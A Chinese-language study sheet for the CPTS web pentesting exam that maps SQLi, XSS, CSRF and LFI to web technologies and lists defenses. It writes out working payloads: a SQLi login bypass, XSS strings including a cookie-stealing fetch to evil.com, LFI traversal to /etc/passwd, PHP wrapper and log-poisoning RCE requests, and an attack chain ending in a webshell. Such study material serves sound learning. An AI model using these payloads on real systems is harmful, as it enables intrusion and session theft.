CPTS / Web Pentesting 必備基礎。建立 HTML、CSS、JavaScript 與四大漏洞（SQLi、XSS、CSRF、LFI）之間的關聯。

漏洞關聯總覽

漏洞主要關聯技術攻擊位置核心原因
SQLiHTML (表單) → 後端 SQL伺服器端使用者輸入直接拼進 SQL 語句
XSSHTML + JavaScript客戶端使用者輸入被當作 HTML/JS 執行
CSRFHTML (表單/img) + Cookie客戶端 → 伺服器瀏覽器自動帶 Cookie，伺服器沒驗證來源
LFIHTML (連結/參數) → 後端檔案伺服器端使用者輸入被當作檔案路徑

HTTP 請求生命週期

使用者在瀏覽器操作（填表單、點連結）
    ↓
瀏覽器組裝 HTTP Request
    ├── URL / Method / Headers / Body
    ↓
後端程式處理
    ├── 查詢資料庫 → SQL 語句     ← SQLi 發生處
    ├── 讀取檔案 → 檔案路徑        ← LFI 發生處
    └── 組裝回應 HTML              ← XSS 發生處（反射型）
    ↓
瀏覽器渲染頁面
    └── 執行 JS → DOM-based XSS 發生處

SQL Injection (SQLi)

後端把使用者輸入直接拼接進 SQL 語句：

-- 使用者輸入：admin' OR 1=1--
-- 實際執行：
SELECT * FROM users WHERE username = 'admin' OR 1=1--'
-- OR 1=1 永遠為真 → 回傳所有使用者
類型特徵資料取得方式
Union-based頁面顯示查詢結果UNION SELECT
Error-based頁面顯示錯誤訊息利用 SQL 錯誤洩漏
Boolean Blind兩種狀態逐 bit 推斷
Time-based Blind完全沒回饋SLEEP() 觀察回應時間

Cross-Site Scripting (XSS)

使用者輸入被原封不動嵌入 HTML，瀏覽器當作合法 JS 執行。

三種類型：

  • Reflected — payload 在 URL，伺服器反射回 HTML
  • Stored — payload 存進資料庫，其他使用者瀏覽時觸發
  • DOM-based — 完全在前端處理，不經過伺服器
<!-- 基本 -->
<script>alert('XSS')</script>

<!-- 繞過 <script> 過濾 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- 竊取 Cookie -->
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

CSRF vs XSS 的關鍵區別

比較CSRFXSS
攻擊位置攻擊者自己的網站目標網站
需要 JS？不一定幾乎都要
能讀回應？❌ 不能（同源政策）✅ 可以
🔑 XSS 是 CSRF 的超集：有 XSS 就能做 CSRF 能做的一切

Local File Inclusion (LFI)

# 基本目錄穿越
?file=../../../../etc/passwd

# PHP Wrapper（必考！）
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://input     # POST body 當 PHP 執行

# Log Poisoning → RCE
# 1. User-Agent 注入 PHP code
# 2. LFI 包含日誌
?file=../../../../var/log/apache2/access.log&cmd=id

LFI → RCE 路徑

LFI（讀取檔案）
├── 讀 /etc/passwd → 列舉使用者
├── 讀原始碼（php://filter）→ 找更多漏洞
├── Log Poisoning → 包含日誌 = RCE
├── PHP Session 中毒 → 包含 session 檔案 = RCE
└── PHP Wrappers → php://input / data:// → 直接 RCE

漏洞串聯攻擊鏈

1. 發現 LFI → 讀取 PHP 原始碼
2. 原始碼中找到 SQLi 注入點 + DB 密碼
3. SQLi 取得 admin 帳密 → 登入後台
4. 後台有 Stored XSS → 植入 JS 後門
5. JS 後門持續竊取其他管理員的 session
6. 利用 admin 權限上傳 webshell → RCE

防禦速查表

漏洞防禦方式
SQLiPrepared Statement、ORM、最小 DB 權限、WAF
XSS輸出編碼、CSP、HttpOnly cookie、輸入驗證
CSRFAnti-CSRF token、SameSite cookie、檢查 Referer
LFI白名單路徑、禁用 allow_url_include、容器隔離

CPTS 考試重點

  • SQLi：一定要會手動注入，理解 UNION 注入的欄位數判斷流程
  • XSS：Stored XSS 在實戰中比 Reflected 更危險
  • CSRF：檢查 SameSite 屬性、token 驗證邏輯
  • LFI：PHP Wrapper 是必考 — php://filter 讀原始碼、php://input 拿 RCE
  • 串聯：考試偏好多步驟攻擊鏈，要習慣從一個漏洞跳到下一個
